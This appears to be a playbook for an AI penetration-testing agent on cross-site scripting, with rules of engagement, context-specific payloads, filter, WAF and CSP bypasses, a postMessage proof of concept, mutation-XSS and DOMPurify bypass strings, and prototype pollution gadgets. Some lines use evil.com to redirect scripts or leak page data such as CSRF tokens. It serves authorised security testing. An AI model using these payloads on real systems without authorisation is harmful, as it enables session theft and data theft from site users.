# Cross-Site Scripting (XSS)

## Scope and preconditions

Applies to any web application that reflects or stores user input in HTML, JavaScript,
CSS, or URL contexts. Covers reflected, stored, DOM-based, mutation XSS, and
advanced techniques including CSP bypass, postMessage abuse, and prototype pollution
chains.

It does **not** cover: CSS-only injection without script execution (use
`css-injection`), HTML injection without script context (use `html-injection`),
or server-side template injection (use `ssti`).

## Rules of engagement

- MUST use benign proof payloads only: custom `alert`, `console.log`, or
  `fetch` to an OOB URL. NEVER use payloads that modify data or steal real
  credentials.
- MUST verify XSS fires in a clean browser session, not just your own.
- NEVER execute payloads that persist permanently without a way to clean up.
- MUST capture the reflected/stored output showing script execution evidence.

## Workflow

- [ ] 1. Identify reflection and storage points
- [ ] 2. Determine context (HTML, attribute, JS, URL)
- [ ] 3. Test basic payloads per context
- [ ] 4. Bypass filters and WAF
- [ ] 5. Test CSP bypass techniques
- [ ] 6. Test DOM-based XSS and postMessage
- [ ] 7. Test mutation XSS (mXSS)
- [ ] 8. Test advanced techniques
- [ ] 9. Verify and record

## Step 1: Identify reflection and storage points

### Goal
Find where user input appears in responses.

### Actions
Use `search_responses` to find your test string (`void12345`) in:
- HTML body (reflected XSS)
- Stored content (comments, profiles, forum posts)
- Error messages, search results, 404 pages
- HTTP headers (header injection → XSS)
- JSON/XML responses rendered by client-side JavaScript

Inject a canary with HTML-significant characters: `void"'<>test` and check which
characters survive encoding in the response.

## Step 2: Determine context

### Goal
Know exactly where your input lands — this determines the payload.

| Context | Input appears in | Break-out technique |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>` |
| Attribute (double-quoted) | `<input value="INPUT">` | `" onmouseover="alert(1)` or `"><script>alert(1)</script>` |
| Attribute (single-quoted) | `<input value='INPUT'>` | `' onmouseover='alert(1)` |
| Attribute (unquoted) | `<input value=INPUT>` | ` onmouseover=alert(1)` (space breaks attribute) |
| JavaScript string | `var x = "INPUT";` | `";alert(1)//` or `\";alert(1)//` |
| JavaScript template literal | `` var x = `INPUT`; `` | `${alert(1)}` |
| URL/href | `<a href="INPUT">` | `javascript:alert(1)` |
| CSS | `style="color: INPUT"` | Use `css-injection` skill |
| Inside `<script>` block | `var config = {key: "INPUT"};` | `"};alert(1);{"x":"` |

## Step 3: Basic payloads per context

### HTML context
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
```

### Attribute context
```
" autofocus onfocus="alert(1)
" onmouseover="alert(1)" x="
'><img src=x onerror=alert(1)>
```

### JavaScript context
```
";alert(1)//
\";alert(1)//
</script><img src=x onerror=alert(1)>
'-alert(1)-'
```

### URL context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

Use `send_request` to inject each payload. Use `compare_responses` to see
what gets filtered versus what passes through.

## Step 4: Bypass filters and WAF

### Common filter bypasses

**Tag blocked** — use alternative tags:
`<svg>`, `<math>`, `<details>`, `<marquee>`, `<video>`, `<audio>`, `<object>`,
`<embed>`, `<iframe>`, `<animate>`, `<set>`, `<use>`

**Event handler blocked** — use less common handlers:
`ontoggle`, `onbegin` (SVG animate), `onanimationend`, `onpointerenter`,
`onfocusin`, `onauxclick`, `onwheel`

**`alert` blocked**: Use `confirm(1)`, `prompt(1)`, `print()`,
`window['al'+'ert'](1)`, `` `${alert(1)}` ``

**Parentheses blocked**: `alert`1`` (tagged template), `throw/a]er/.source`
with error handler, `location='javascript:alert\x281\x29'`

**Case-sensitive filter**: `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>`

**Quotes blocked**: `<img src=x onerror=alert(1)>` (no quotes needed),
`` <img src=x onerror=alert`1`> ``

Use `run_intruder_attack` with a payload list to test which vectors pass.

## Step 5: CSP bypass techniques

### Goal
Bypass Content Security Policy that blocks inline scripts.

### Actions
First, read the CSP header from `search_responses`. Then check for:

**Missing `base-uri`**: Inject `<base href="https://evil.com/">` to redirect
all relative URLs (script src, form action) to attacker domain.

**CDN in `script-src`**: If `script-src` includes a CDN (cdnjs, jsdelivr, unpkg),
find JSONP or Angular template injection on that CDN:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

**`object-src` not set**: Use `<object>` or `<embed>` to load attacker content.

**`unsafe-eval` present**: DOM clobbering + `eval()` via framework gadgets.

**Nonce reuse**: If the nonce is static or predictable, inject a script with
the known nonce: `<script nonce="KNOWN_NONCE">alert(1)</script>`

**`strict-dynamic`**: If present, any script created by a trusted script is
also trusted. Find a gadget: a script that creates new script elements from
user-controlled data.

**`blob:` or `data:` in sources**: 
```html
<script src="data:text/javascript,alert(1)"></script>
```

## Step 6: DOM-based XSS and postMessage

### Goal
Find XSS that never hits the server — payload lives entirely in the DOM.

### DOM sources to check
Look in JavaScript for user-controlled inputs being used unsafely:
- `location.hash`, `location.search`, `location.href`
- `document.referrer`
- `window.name`
- `postMessage` event data

### DOM sinks (dangerous functions)
- `innerHTML`, `outerHTML`, `document.write()`
- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
- `.src`, `.href`, `.action` assignments
- `jQuery.html()`, `$(user_input)`, `.append(user_input)`

### postMessage testing

Search JavaScript for `addEventListener('message', ...)` and check origin
validation:

| Pattern | Vulnerable? |
|---|---|
| No origin check at all | Yes — any window can send messages |
| `event.origin.indexOf('trusted.com')` | Yes — `attacker-trusted.com` matches |
| `event.origin.endsWith('trusted.com')` | Yes — `eviltrusted.com` matches |
| `event.origin === 'null'` | Yes — sandboxed iframe sends null origin |
| `/trusted\.com/.test(event.origin)` | Depends — anchored regex? |
| `event.origin === 'https://trusted.com'` | Secure — exact match |

PoC for postMessage XSS:
```html
<iframe src="https://target.com/vulnerable-page" id="f"></iframe>
<script>
document.getElementById('f').contentWindow.postMessage(
  '<img src=x onerror=alert(document.domain)>', '*'
);
</script>
```

## Step 7: Mutation XSS (mXSS)

### Goal
Exploit browser HTML parser mutations that bypass server-side sanitizers.

### Technique
The server sanitizes the HTML, considers it safe, and stores it. When the
browser re-parses the sanitized HTML, it mutates the DOM in a way that creates
executable script:

**Namespace confusion** (SVG/MathML in HTML):
```html
<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>
```
The SVG parser treats `<![CDATA[` differently than the HTML parser. The
sanitizer (running an HTML parser) sees safe content. The browser (switching
to SVG parser) creates an `<img>` element.

**Encoding in attributes**:
```html
<img src=x onerror="&#x61;lert(1)">
```
Some sanitizers check for `alert` but HTML entities are decoded by the browser
before JavaScript execution.

**DOMPurify bypass patterns** (historical):
- `<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>`
- `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">`

These evolve constantly — test with the latest DOMPurify and known bypass
databases.

## Step 8: Advanced techniques

### DOM clobbering
HTML elements can shadow JavaScript globals:
```html
<form id="x"><input name="action" value="javascript:alert(1)"></form>
```
If JS code does `x.action` expecting a function, it gets the input element's
value instead. Chain with `toString()` or `valueOf()` for code execution.

### Dangling markup injection
When full XSS is not possible (e.g., attribute context, tags stripped), steal
page content:
```html
<img src="https://evil.com/steal?data=
```
Everything between this injected tag and the next `"` in the page source is
sent to the attacker as part of the image URL. This can capture CSRF tokens,
session data, or personal information.

### Prototype pollution to XSS
If the application has a prototype pollution vulnerability:
```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=javascript:alert(1)
```
Framework gadgets (jQuery, Lodash, Vue) may use polluted prototype properties
to set innerHTML or src attributes.

### Service Worker persistence
If you can register a Service Worker:
```javascript
navigator.serviceWorker.register('/sw.js')
```
The XSS becomes persistent — the SW intercepts ALL requests to the origin
until explicitly unregistered. Upload path that lands at `/sw.js` or response
with `Service-Worker-Allowed: /` header.

## Step 9: Verify and record

### Verification checklist
1. XSS fires in a clean session (different browser/incognito)
2. The payload is not self-XSS (requires victim to paste into console)
3. Evidence: screenshot or response showing script execution
4. For stored XSS: the payload persists across page reloads

Use `add_pentest_finding` with:
- Injection point (parameter, field, header)
- Context (HTML, attribute, JS, DOM)
- The payload that succeeded
- CSP bypass technique if applicable
- Impact: what an attacker can do (session theft, keylogging, account takeover)

## Known false positives

- Payload reflected in response but not in HTML context (e.g., JSON response
  with `Content-Type: application/json`) — not XSS unless the response is
  rendered as HTML.
- Self-XSS that requires the victim to paste payload into their own console.
- XSS in a sandboxed iframe with no access to parent origin.
- Reflected input in a PDF download — not browser XSS, may be PDF injection.
- `alert(1)` appears in an error message as a string, not as executed JS.

## Reminder

XSS is about context. The same payload is harmless in one context and critical
in another. Always identify the exact context first, then choose the minimal
payload that breaks out of it. The three highest-impact XSS scenarios: **stored
XSS in a shared page** (affects all visitors), **DOM XSS via postMessage**
(often missed by scanners), and **CSP bypass + XSS** (proves defense-in-depth
failure). If CSP blocks your payload, the vulnerability still exists — report
it and then try to bypass the CSP as a separate finding.
